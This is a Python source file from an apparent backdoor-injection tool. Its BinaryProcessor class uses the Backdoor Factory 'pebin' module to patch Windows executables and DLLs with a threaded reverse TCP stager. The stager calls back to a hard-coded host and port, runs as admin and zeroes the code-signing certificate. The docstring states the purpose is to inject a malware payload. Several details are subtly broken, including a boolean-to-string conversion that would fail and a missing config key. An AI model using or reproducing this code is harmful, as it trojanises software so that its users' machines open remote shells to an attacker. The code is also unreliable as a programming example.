#  Copyright (c) 2021 - Darsh Patel
#  All rights reserved.
#  Redistribution and use in source and binary forms, with or without modification,
#  are permitted provided that the following conditions are met:
#      1. Redistributions of source code must retain the above copyright notice,
#      this list of conditions and the following disclaimer.
#      2. Redistributions in binary form must reproduce the above copyright notice,
#      this list of conditions and the following disclaimer in the documentation
#      and/or other materials provided with the distribution.
#      3. Neither the name of the copyright holder nor the names of its contributors
#      may be used to endorse or promote products derived from this software without
#      specific prior written permission.
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
#  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
#  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
#  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
#  CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
#  SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
#  INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
#  CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
#  ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
#  POSSIBILITY OF SUCH DAMAGE.

import tempfile

import logging
import pefile
import os
from .backdoorfactory import pebin

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)


class BinaryProcessor:
    def __init__(self, binary_content):
        self.logger = logger
        self.binary_content = binary_content

        self.binary_format = self.check_binary_format(self.binary_content)
        self.file = None

        # ToDo: Temporary, Use argparser
        self.config = {
            'PATCH_TYPE': 'append',
            'PATCH_METHOD': 'automatic',
            'SHELL': 'iat_reverse_tcp_stager_threaded',
            'HOST': '192.168.1.25',
            'PORT': '4444',
            'RUNAS_ADMIN': True,
            'PATCH_DLL': True,
            'SUPPLIED_SHELLCODE': None,
            'ZERO_CERT': True,
            'IDT_IN_CAVE': False,
            'CODE_SIGN': False,
            'PREPROCESS': False

        }

    def save(self):
        """
        Saves the binary file to a temporary location
        """
        self.file = tempfile.NamedTemporaryFile()
        self.file.write(self.binary_content)
        self.file.flush()
        self.file.seek(0)
        self.logger.info(f"Saved Binary at: {self.file.name}")

    @staticmethod
    def check_binary_format(_bytes) -> str:
        """
        Checks the magic bytes of a binary string to determine file format
        :param _bytes: byte string of a binary
        :return: String Containing format of the bianry
        """
        magic_bytes = {
            b'MZ': 'pe',
            b'7f454c46': 'elf',
            b'cffaedfe': 'machox64',
        }
        if _bytes[0:2] in magic_bytes:
            return magic_bytes[_bytes[0:2]]
        elif _bytes[0:8] in magic_bytes:
            return magic_bytes[_bytes[0:8]]
        else:
            return None

    def patch(self) -> object:
        """
        Processes Binary files to inject malware payload
        :return: Patched Binary, or None if failed to patch
        """
        result = None
        try:
            if self.binary_format == 'pe':
                pe = pefile.PE(data=self.file, fast_load=True)
                magic = pe.OPTIONAL_HEADER.Magic
                machine_type = pe.FILE_HEADER.Machine
                # update when supporting more than one arch
                if magic == int('20B', 16) and (
                        machine_type == 0x8664 or machine_type == 0x14c):
                    add_section = False
                    cave_jumping = False
                    if self.config['PATCH_TYPE'].lower() == 'append':
                        add_section = True
                    elif self.config['PATCH_TYPE'].lower() == 'jump':
                        cave_jumping = True

                    # if automatic override
                    if self.config['PATCH_METHOD'].lower() == 'automatic':
                        cave_jumping = True

                    target_file = pebin.pebin(FILE=self.file,
                                              OUTPUT=os.path.basename(self.file),
                                              SHELL=self.config['SHELL'],
                                              HOST=self.config['HOST'],
                                              PORT=int(self.config['PORT']),
                                              ADD_SECTION=add_section,
                                              CAVE_JUMPING=cave_jumping,
                                              IMAGE_TYPE='ALL',
                                              RUNAS_ADMIN=self.str2bool(
                                                  self.config['RUNAS_ADMIN']),
                                              PATCH_DLL=self.str2bool(
                                                  self.config['PATCH_DLL']),
                                              SUPPLIED_SHELLCODE=self.config[
                                                  'SUPPLIED_SHELLCODE'],
                                              ZERO_CERT=self.str2bool(
                                                  self.config['ZERO_CERT']),
                                              PATCH_METHOD=self.config[
                                                  'PATCH_METHOD'].lower(),
                                              SUPPLIED_BINARY=self.config[
                                                  'SUPPLIED_BINARY'],
                                              IDT_IN_CAVE=self.str2bool(
                                                  self.config['IDT_IN_CAVE']),
                                              CODE_SIGN=self.str2bool(
                                                  self.config['CODE_SIGN']),
                                              PREPROCESS=self.str2bool(
                                                  self.config['PREPROCESS']),
                                              )

                    result = target_file.run_this()
            return result, self.file
        except Exception as e:
            logger.error(f'Could Not Patch File: {e}')

    def str2bool(self, string):
        if string.lower() == 'true':
            return True
        elif string.lower() == 'false':
            return False
        else:
            return None
